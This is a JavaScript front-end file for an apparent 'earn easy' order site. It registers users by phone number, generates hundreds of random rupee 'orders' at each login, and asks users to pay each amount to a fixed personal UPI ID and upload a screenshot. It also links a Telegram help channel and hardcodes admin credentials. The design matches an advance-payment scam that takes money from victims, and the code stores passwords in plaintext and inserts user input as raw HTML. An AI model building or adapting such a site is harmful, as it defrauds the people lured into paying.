// Dummy user data for simulation
let users = [];
let currentUser = null;
let orders = [];

// Register a user
function registerUser() {
    const number = document.getElementById('regNumber').value;
    const password = document.getElementById('regPassword').value;
    
    if (number && password) {
        users.push({ number, password, orders: [] });
        alert('User registered successfully!');
        showLogin();
    } else {
        alert('Please fill all fields');
    }
}

// Show login form after registration
function showLogin() {
    document.getElementById('registrationForm').style.display = 'none';
    document.getElementById('loginForm').style.display = 'block';
}

// User login
function loginUser() {
    const number = document.getElementById('loginNumber').value;
    const password = document.getElementById('loginPassword').value;
    
    const user = users.find(u => u.number === number && u.password === password);
    
    if (user) {
        currentUser = user;
        showOrdersPage();
    } else {
        alert('Invalid login credentials');
    }
}

// Show orders page after login
function showOrdersPage() {
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('ordersPage').style.display = 'block';
    
    // Randomly generate 500+ orders
    for (let i = 0; i < 500; i++) {
        const orderAmount = Math.floor(Math.random() * 10000) + 1000;
        currentUser.orders.push(orderAmount);
    }
    
    displayOrders();
}

// Display user's orders
function displayOrders() {
    const ordersList = document.getElementById('ordersList');
    ordersList.innerHTML = '';  // Clear previous orders
    currentUser.orders.forEach(orderAmount => {
        const orderDiv = document.createElement('div');
        orderDiv.innerHTML = `
            <p>Order Amount: ₹${orderAmount}</p>
            <button onclick="payOrder(${orderAmount})">Pay</button>
        `;
        ordersList.appendChild(orderDiv);
    });
}

// Handle payment for an order
function payOrder(orderAmount) {
    const upiId = '8930757407@JIO';
    const paymentMessage = `Pay ₹${orderAmount} to UPI ID: ${upiId}`;
    
    const userConfirmed = confirm(paymentMessage);
    
    if (userConfirmed) {
        alert('Payment successful! Please upload the screenshot.');
    }
}

// Open Help Link
function openHelpLink() {
    window.open('https://t.me/EARNEASY_2025', '_blank');
}

// Admin Login
function loginAdmin() {
    const adminNumber = document.getElementById('adminNumber').value;
    const adminPassword = document.getElementById('adminPassword').value;
    
    if (adminNumber === '8930757407' && adminPassword === '3497') {
        showAdminPanel();
    } else {
        alert('Invalid admin credentials');
    }
}

// Show Admin Panel
function showAdminPanel() {
    document.getElementById('adminPanel').style.display = 'none';
    document.getElementById('adminData').style.display = 'block';
    
    const userOrdersDiv = document.getElementById('userOrders');
    userOrdersDiv.innerHTML = ''; // Clear previous user orders
    
    users.forEach(user => {
        const userDiv = document.createElement('div');
        userDiv.innerHTML = `
            <h3>User: ${user.number}</h3>
            <p>Completed Orders: ${user.orders.length}</p>
            <button onclick="markOrderPending('${user.number}')">Mark Pending</button>
        `;
        userOrdersDiv.appendChild(userDiv);
    });
}

// Mark order as pending (for demo purposes)
function markOrderPending(userNumber) {
    alert(`Order for user ${userNumber} marked as pending`);
}

